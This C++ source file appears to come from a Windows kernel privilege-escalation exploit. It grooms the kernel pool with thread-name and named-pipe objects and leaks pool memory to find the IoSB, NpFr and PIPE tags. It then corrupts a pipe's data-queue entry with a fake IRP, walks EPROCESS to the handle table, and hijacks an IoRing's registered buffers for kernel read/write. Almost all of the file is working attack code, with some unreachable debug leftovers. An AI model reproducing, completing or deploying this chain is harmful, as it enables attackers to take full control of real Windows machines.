#include "memoryBroker.h"
#include "Hvergelmir.h"
#include "pipeManager.h"
#include "config.h"
#include <algorithm>

namespace
{
    bool ChunkIsAllZero(const BYTE* data, UINT64 size)
    {
        if (!data)
            return false;

        for (UINT64 i = 0; i < size; ++i)
        {
            if (data[i] != 0)
                return false;
        }

        return true;
    }

    bool ChunkHasPipeObject(const BYTE* data, UINT64 size)
    {
        if (!data || size < 4)
            return false;

        for (UINT64 i = 0; i + 4 <= size; ++i)
        {
            if (memcmp(data + i, "PIPE", 4) == 0)
                return true;
        }

        return false;
    }

    bool ChunkHasThreadNameObject(const BYTE* data, UINT64 size)
    {
        if (!data || size < 4)
            return false;

        for (UINT64 i = 0; i + 4 <= size; ++i)
        {
            if (memcmp(data + i, "ThNm", 4) == 0)
                return true;
        }

        return false;
    }

    bool ChunkIsReusableSlot(const BYTE* data, UINT64 size)
    {
        return ChunkIsAllZero(data, size) ||
            ChunkHasPipeObject(data, size) ||
            ChunkHasThreadNameObject(data, size);
    }

    bool HasReusableSlotFrom(const BYTE* leak, UINT64 leakSize, UINT64 startSlot)
    {
        if (!leak || leakSize < CHUNKSIZE)
            return false;

        const UINT64 slotCount = leakSize / CHUNKSIZE;
        for (UINT64 slot = startSlot; slot < slotCount; ++slot)
        {
            const BYTE* chunk = leak + (slot * CHUNKSIZE);
            if (ChunkIsReusableSlot(chunk, CHUNKSIZE))
                return true;
        }

        return false;
    }

    bool AllLeakSlotsFilledIgnoringPipes(const BYTE* leak, UINT64 leakSize)
    {
        return !HasReusableSlotFrom(leak, leakSize, 0);
    }
}


std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
{
    auto nameManagerLocked = nameManager.lock();
    if (!nameManagerLocked) {
        DEBUG_PRINT(" [!] No ThreadNameManager registered\n");
        return std::nullopt;
    }

    auto pipeManagerLocked = pipeManager.lock();
    if (!pipeManagerLocked) {
        DEBUG_PRINT(" [!] No PipeManager available\n");
        return std::nullopt;
    }

    const UINT64 captureAttempts = PIPE_LAYOUT_CAPTURE_ATTEMPTS;
    const UINT64 iosbLeaksPerAttempt = PIPE_LAYOUT_IOSB_LEAKS_PER_ATTEMPT;
    const UINT64 pipeAttemptsPerIosb = PIPE_LAYOUT_PIPE_ATTEMPTS_PER_IOSB;
    const UINT64 pipeLeaksPerAttempt = PIPE_LAYOUT_PIPE_LEAKS_PER_ATTEMPT;

    for (UINT64 capture = 0; capture < captureAttempts; ++capture)
    {
        DEBUG_PRINT("\n [*] Pipe layout attempt %llu/%llu\n", (unsigned long long)(capture + 1), (unsigned long long)captureAttempts);

        if (!nameManagerLocked->GetDataLeak(CHUNKSIZE, CHUNKSIZE * 10, 10)) {
            return std::nullopt;
        }

        bool needNewLeak = false;
        UINT64 iosbAttempt = 0;
        UINT64 nullLeakReads = 0;

        while (!needNewLeak && iosbAttempt < MAX_TRIES_PER_LEAK)
        {
            DEBUG_PRINT(
                " [*] IoSB attempt %llu for capture %llu\n",
                (unsigned long long)(iosbAttempt + 1),
                (unsigned long long)(capture + 1)
            );

            InvokePrimeOverflow(CHUNKSIZE);

            bool iosbConfirmed = false;
            UINT64 confirmedIosbOffset = 0;
            UINT64 confirmedIosbSlot = 0;
            bool leakSlotsFilledWithoutIosb = false;

            for (UINT64 iosbLeak = 0; iosbLeak < iosbLeaksPerAttempt; ++iosbLeak)
            {
                BYTE* leakPtr = nameManagerLocked->LeakDataMalloc();
                if (!leakPtr) {
                    DEBUG_PRINT(" [!] Failed to read leak while looking for IoSB on leak %llu\n", (unsigned long long)iosbLeak);
                    ++nullLeakReads;
                    if (nameManagerLocked->ShouldRefreshLeak() ||
                        nullLeakReads >= THREADNAME_NULL_READS_BEFORE_REFRESH) {
                        DEBUG_PRINT(" [*] Refreshing ThreadName leak after failed IoSB leak reads\n");
                        leakSlotsFilledWithoutIosb = true;
                    }
                    if (leakSlotsFilledWithoutIosb)
                        break;
                    continue;
                }

                nullLeakReads = 0;
                const UINT64 leakSize = nameManagerLocked->leakSize;
                std::vector<UINT64> iosbOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "IoSB");

                if (!iosbOffsets.empty()) {
                    std::sort(iosbOffsets.begin(), iosbOffsets.end());

                    for (UINT64 iosbOffset : iosbOffsets) {
                        UINT64 iosbSlot = iosbOffset / CHUNKSIZE;
                        if (HasReusableSlotFrom(leakPtr, leakSize, iosbSlot + 1)) {
                            confirmedIosbOffset = iosbOffset;
                            confirmedIosbSlot = iosbSlot;
                            iosbConfirmed = true;
                            break;
                        }
                    }

                    DEBUG_PRINT(
                        " [*] Found %zu IoSB candidates before pipe allocation on capture %llu IoSB attempt %llu leak %llu\n",
                        iosbOffsets.size(),
                        (unsigned long long)capture,
                        (unsigned long long)iosbAttempt,
                        (unsigned long long)iosbLeak
                    );

                    if (!iosbConfirmed) {
                        DEBUG_PRINT(" [*] IoSB candidates had no reusable slots after them; getting a new leak\n");
                        leakSlotsFilledWithoutIosb = true;
                    }
                    else {
                        DEBUG_PRINT(
                            " [*] Using IoSB candidate at offset 0x%llx slot %llu with reusable space after it\n",
                            (unsigned long long)confirmedIosbOffset,
                            (unsigned long long)confirmedIosbSlot
                        );
                    }
                }
                else if (AllLeakSlotsFilledIgnoringPipes(leakPtr, leakSize)) {
					HexDumpLittleEndian(leakPtr, (size_t)leakSize);
                    DEBUG_PRINT(" [*] Current leak has no IoSB and all non-pipe slots are filled; getting a new leak\n");
                    leakSlotsFilledWithoutIosb = true;
                }

                free(leakPtr);
                if (iosbConfirmed || leakSlotsFilledWithoutIosb)
                    break;
            }

            if (!iosbConfirmed) {
                InvokePassOverflow();
                needNewLeak = leakSlotsFilledWithoutIosb;
                if (!needNewLeak)
                    ++iosbAttempt;
                continue;
            }

            for (UINT64 pipeAttempt = 0; pipeAttempt < pipeAttemptsPerIosb; ++pipeAttempt)
            {
                UINT64 pipeCreateSize = PIPE_LAYOUT_PIPE_CREATE_INITIAL +
                    (pipeAttempt * PIPE_LAYOUT_PIPE_CREATE_STEP);
                if (pipeCreateSize > PIPE_LAYOUT_PIPE_CREATE_MAX)
                    pipeCreateSize = PIPE_LAYOUT_PIPE_CREATE_MAX;

                DEBUG_PRINT(
                    " [*] Pipe allocation attempt %llu/%llu after confirmed IoSB, creating %llu pipes\n",
                    (unsigned long long)(pipeAttempt + 1),
                    (unsigned long long)pipeAttemptsPerIosb,
                    (unsigned long long)pipeCreateSize
                );

                pipeManagerLocked->CreatePipes(pipeCreateSize);

                for (UINT64 pipeLeak = 0; pipeLeak < pipeLeaksPerAttempt; ++pipeLeak)
                {
                    BYTE* leakPtr = nameManagerLocked->LeakDataMalloc();
                    if (!leakPtr) {
                        DEBUG_PRINT(" [!] Failed to read leak while looking for pipe on leak %llu\n", (unsigned long long)pipeLeak);
                        ++nullLeakReads;
                        if (nameManagerLocked->ShouldRefreshLeak() ||
                            nullLeakReads >= THREADNAME_NULL_READS_BEFORE_REFRESH) {
                            DEBUG_PRINT(" [*] Refreshing ThreadName leak after failed pipe leak reads\n");
                            needNewLeak = true;
                            break;
                        }
                        continue;
                    }

                    nullLeakReads = 0;
                    const UINT64 leakSize = nameManagerLocked->leakSize;
                    std::vector<UINT64> iosbOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "IoSB");
                    std::vector<UINT64> npfrOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "NpFr");

                    if (iosbOffsets.empty() || npfrOffsets.empty())
                    {
                        if (!HasReusableSlotFrom(leakPtr, leakSize, confirmedIosbSlot + 1)) {
                            DEBUG_PRINT(" [*] All slots after confirmed IoSB are filled; getting a new leak\n");
                            needNewLeak = true;
                        }

                        free(leakPtr);
                        if (needNewLeak)
                            break;

                        continue;
                    }

                    std::sort(iosbOffsets.begin(), iosbOffsets.end());
                    std::sort(npfrOffsets.begin(), npfrOffsets.end());

                    DEBUG_PRINT(
                        " [*] Same leak has %zu IoSB and %zu NpFr candidates on pipe leak %llu\n",
                        iosbOffsets.size(),
                        npfrOffsets.size(),
                        (unsigned long long)pipeLeak
                    );

                    for (UINT64 iosbOffset : iosbOffsets) {
                        auto npfrIt = std::lower_bound(npfrOffsets.begin(), npfrOffsets.end(), iosbOffset + 1);
                        for (; npfrIt != npfrOffsets.end(); ++npfrIt) {
                            UINT64 npfrOffset = *npfrIt;
                            if (npfrOffset <= iosbOffset) continue;

                            UINT64 pipeBase = (npfrOffset >= 0x4) ? (npfrOffset - 0x4) : 0;
                            if (pipeBase >= leakSize) continue;

                            UINT64 remaining = leakSize - pipeBase;
                            size_t searchSize = (size_t)((remaining < (UINT64)CHUNKSIZE) ? remaining : (UINT64)CHUNKSIZE);
                            if (searchSize == 0) continue;

                            std::vector<UINT64> markerOffsets = ScanForPoolTag(leakPtr + pipeBase, searchSize, "PIPE");
                            if (markerOffsets.empty()) continue;

                            UINT64 absolutePos = pipeBase + markerOffsets.front();
                            const UINT64 indexPos = absolutePos + 4;
                            if (indexPos + sizeof(UINT32) > leakSize) continue;

                            UINT32 pipeIndex = 0;
                            memcpy(&pipeIndex, leakPtr + indexPos, sizeof(pipeIndex));


                            if (iosbOffset < 0x4) continue;

                            UINT64 iosbBase = iosbOffset - 0x4;
                            UINT64 distance = pipeBase - iosbBase;
                            UINT64 desiredEnd = pipeBase + CHUNKSIZE + 0x20;
                            if (desiredEnd > leakSize) desiredEnd = leakSize;
                            if (iosbBase >= desiredEnd) continue;

                            UINT64 sliceLen = desiredEnd - iosbBase;

                            LeakLayoutResult result;
                            result.leakedData.resize((size_t)sliceLen);
                            memcpy(result.leakedData.data(), leakPtr + iosbBase, (size_t)sliceLen);
                            result.targetPipeOffset = distance;
                            result.pipeIndex = pipeIndex;

                            DEBUG_PRINT(
                                " [*] Found layout in same leak: IoSB=%llx NpFr=%llx pipeBase=%llx pipeIndex=%u capture=%llu iosbAttempt=%llu pipeAttempt=%llu pipeLeak=%llu\n",
                                iosbOffset,
                                npfrOffset,
                                pipeBase,
                                pipeIndex,
                                (unsigned long long)capture,
                                (unsigned long long)iosbAttempt,
                                (unsigned long long)pipeAttempt,
                                (unsigned long long)pipeLeak
                            );

                            free(leakPtr);
                            return result;
                        }
                    }

                    if (!HasReusableSlotFrom(leakPtr, leakSize, confirmedIosbSlot + 1)) {
                        DEBUG_PRINT(" [*] All slots after confirmed IoSB are filled; getting a new leak\n");
                        needNewLeak = true;
                    }

                    free(leakPtr);
                    if (needNewLeak)
                        break;
                }

                pipeManagerLocked->ClearPipes();
                if (needNewLeak)
                    break;

                Sleep(50);
            }

            InvokePassOverflow();
            if (!needNewLeak)
                ++iosbAttempt;

            Sleep(50);
        }

        if (!needNewLeak && iosbAttempt >= MAX_TRIES_PER_LEAK) {
            DEBUG_PRINT(
                " [*] Current leak reached attempt limit %llu; getting a new leak\n",
                (unsigned long long)MAX_TRIES_PER_LEAK
            );
        }

        nameManagerLocked->ClearThreads();
        //Sleep(100);
    }

    return std::nullopt;
}



bool MemoryBroker::CorruptPipe()
{
    CreateFakeIRP();

    auto layoutOpt = GetPipeLayout();
    if (!layoutOpt) {
        DEBUG_PRINT(" [!] Failed to obtain thread name layout\n");
        return false;
    }


    LeakLayoutResult layout = std::move(*layoutOpt);

    // Validate sizes
    if (layout.leakedData.size() < layout.targetPipeOffset + CHUNKSIZE) {
        DEBUG_PRINT(" [!] leakedData too small for payload copy\n");
        return false;
    }
    size_t payloadSize = layout.leakedData.size() - CHUNKSIZE - (CHUNKSIZE - sizeof(LFH_NP_DATA_QUEUE_ENTRY));

    std::vector<BYTE> payload(payloadSize);

	memcpy(payload.data(), layout.leakedData.data() + CHUNKSIZE - 0x10, (size_t)payloadSize);
	//HexDumpLittleEndian(layout.leakedData.data(), (size_t)layout.leakedData.size());

    // Write NP_DATA_QUEUE_ENTRY fields into payload
    LFH_NP_DATA_QUEUE_ENTRY* entry = reinterpret_cast<LFH_NP_DATA_QUEUE_ENTRY*>(payload.data() + (layout.targetPipeOffset - CHUNKSIZE + 0x10));
    entry->dataQueue.Irp = fakeIRP;
    entry->dataQueue.EntryType = 0x1;

	HexDumpLittleEndian(layout.leakedData.data(), (size_t)layout.leakedData.size());
	printf(" [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x%llx within leaked chunk\n", (unsigned long long)(layout.targetPipeOffset - CHUNKSIZE + 0x10));
	HexDumpLittleEndian(entry, sizeof(NP_DATA_QUEUE_ENTRY));
	printf(" [*] Full payload to trigger overflow:\n");
    HexDumpLittleEndian(payload.data(), (size_t)payload.size());


    return true;

    DEBUG_PRINT(" [*] Triggering Overflow to Corrupt NP_DATA_QUEUE_ENTRY of Target Pipe\n");
    UINT64 clientManager = 0;
    memcpy(&clientManager, entry->dataQueue.NextEntry.Flink, sizeof(UINT64));

    // Trigger overflow with payload


    InvokeTriggerOverflow(payload.data(), (UINT64)payload.size());
	printf(" [*] Overflow triggered, waiting for corruption to take effect...\n");

    auto pipeManagerLocked = pipeManager.lock();
    if (!pipeManagerLocked) {
        DEBUG_PRINT(" [!] No PipeManager available for verification\n");
        return false;
    }

    if (!pipeManagerLocked->VerifyCorruption())
    {
        DEBUG_PRINT(" [!] Failed to verify corruption\n");
        return false;
    }
	DEBUG_PRINT(" [*] Successfully corrupted target pipe's NP_DATA_QUEUE_ENTRY\n");

    Sleep(10000000);//./
    return true;
}





bool MemoryBroker::FindEPROCESS(UINT64 iClientManager)
{
    DEBUG_PRINT("\n [*] ###### Locating EPROCESS and OBJECT_TABLE ######\n");

	if (iClientManager == 0) {
		DEBUG_PRINT(" [!] Invalid client manager pointer (0)\n");
		return false;
	}

	UINT64 fileObject = 0;
	Read(&fileObject, iClientManager - 0x10, sizeof(UINT64));
	if (fileObject == 0) {
		DEBUG_PRINT(" [!] Failed to read FILE_OBJECT from client manager\n");
		return false;
	}

	UINT64 eprocess = 0;
	// guard against underflowed or small addresses
	if (fileObject <= 0x1000) {
		DEBUG_PRINT(" [!] FILE_OBJECT looks invalid: %p\n", (void*)fileObject);
		return false;
	}

	Read(&eprocess, fileObject - 0x40, sizeof(UINT64));
	if (eprocess == 0) {
		DEBUG_PRINT(" [!] Failed to read EPROCESS from FILE_OBJECT\n");
		return false;
	}

	DEBUG_PRINT("     Found EPROCESS: %p\n", (void*)eprocess);

	UINT64 handleTableLocal = 0;
	Read(&handleTableLocal, eprocess + 0x300, sizeof(UINT64));
	if (handleTableLocal == 0) {
		DEBUG_PRINT(" [!] Failed to read HANDLE_TABLE from EPROCESS\n");
		return false;
	}

	this->HANDLE_TABLE = handleTableLocal;
	DEBUG_PRINT("     Found HANDLE_TABLE: %p\n", (void*)this->HANDLE_TABLE);

	return true;
}


bool MemoryBroker::GetIORingLayout()
{
	bool correctLayout = false;

    auto ioRingManagerLocked = ioRingManager.lock();


    while (!correctLayout)
    {
        ioRingManagerLocked->CreateRings(1000);
        InvokePrimeOverflow(IORING_CHUNK_SIZE);

        for (UINT64 i = 0; i < ioRingManagerLocked->ioRingCount; ++i)
        {
            targetRingAddr = HandleToPointer(*(HANDLE*)ioRingManagerLocked->ioRings[i]) - 0x60;

            UINT64 adjacentData;
            Read(&adjacentData, targetRingAddr - 0x20, sizeof(UINT64));

            if (adjacentData == 0x6161616161616161)
            {
                ioRingManagerLocked->corruptedRing = ioRingManagerLocked->ioRings[i];
                correctLayout = true;
                break;
            }
        }

        if (!correctLayout)
        {
            ioRingManagerLocked->ClearRings();
            InvokePassOverflow();
        }
    }
	if (!correctLayout) {
        DEBUG_PRINT(" [!] Failed to find correct IoRing layout\n");
        return false;
    }

    return true;
}


bool MemoryBroker::CorruptIoRing()
{
	if (!targetRingAddr) {
        DEBUG_PRINT(" [!] targetRingAddr not set, cannot corrupt IoRing\n");
        return false;
    }

    UINT64 originalRegBufferList;
    Read(&regBuffersListAddr, targetRingAddr + 0x118, sizeof(UINT64));
    if (!regBuffersListAddr) {
        DEBUG_PRINT(" [!] Failed to read regBuffersListAddr from IoRing\n");
        return false;
	}

    UINT64 regBufferAddr;
    Read(&regBufferAddr, regBuffersListAddr, sizeof(UINT64));
    if (!regBufferAddr) {
        DEBUG_PRINT(" [!] Failed to read regBufferAddr from regBuffersList\n");
        return false;
    }

    BYTE* regBufferContent = new BYTE[0x80];
    Read((UINT64*)regBufferContent, regBufferAddr, 0x80);


    CreateFakeRegBuffer(regBufferContent);

    BYTE* ioRingPayload = new BYTE[IORING_CHUNK_SIZE + 0x10];
    memset(ioRingPayload, 'c', 0x10);

    Read((UINT64*)(ioRingPayload + 0x10), targetRingAddr, IORING_CHUNK_SIZE);

    *(UINT64*)(ioRingPayload + 0x118 + 0x10) = (UINT64)&fakeRegBuffer;
    *(UINT32*)(ioRingPayload + 0x110 + 0x10) = (UINT32)0x1;

    InvokeTriggerOverflow(ioRingPayload, IORING_CHUNK_SIZE + 0x10);

    return true;
}


bool MemoryBroker::Cleanup()
{

    auto pipeManagerLocked = pipeManager.lock();
    auto nameManagerLocked = nameManager.lock();

    UINT64 corruptPipeClient;
    UINT64 corruptPipeFileObject = HandleToPointer(pipeManagerLocked->corruptedPipe);
    if (!corruptPipeFileObject) {
        DEBUG_PRINT(" [!] Failed to get file object for corrupted pipe\n");
        return false;
	}

    for (int i = 0; i < 100; i++)
    {
        Read(&corruptPipeClient, corruptPipeFileObject + 0x20, sizeof(UINT64));
        if (corruptPipeClient != 0x0)
            break;
    }
    corruptPipeClient &= 0xfffffffffffffff0;

    UINT64 corruptPipeAddr;
    Read(&corruptPipeAddr, corruptPipeClient + 0x48, sizeof(UINT64));
	if (!corruptPipeAddr) {
        DEBUG_PRINT(" [!] Failed to get kernel address for corrupted pipe\n");
        return false;
    }

    Write((BYTE*)(corruptPipeAddr + 0x10), 0, 0x8);
    Write((BYTE*)(corruptPipeAddr + 0x20), 0, 0x4);
    Write((BYTE*)(targetRingAddr + 0x118), regBuffersListAddr, 0x8);

    nameManagerLocked->ClearThreads();

}
